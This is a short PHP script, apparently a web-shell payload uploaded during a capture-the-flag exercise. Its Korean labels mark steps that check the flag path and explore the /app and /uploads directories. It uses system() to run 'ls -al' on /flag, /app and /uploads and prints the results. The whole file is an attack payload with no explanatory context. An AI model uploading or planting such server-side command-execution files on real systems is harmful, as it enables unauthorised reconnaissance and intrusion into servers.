<?php
echo "<pre>";
echo "[ flag 경로 확인 ]\n";
system("ls -al /flag 2>&1");
echo "\n\n";

echo "[ /app 내부 탐색 ]\n";
system("ls -al /app 2>&1");
echo "\n\n";

echo "[ uploads 내부 탐색 ]\n";
system("ls -al /uploads 2>&1");
echo "</pre>";
?>
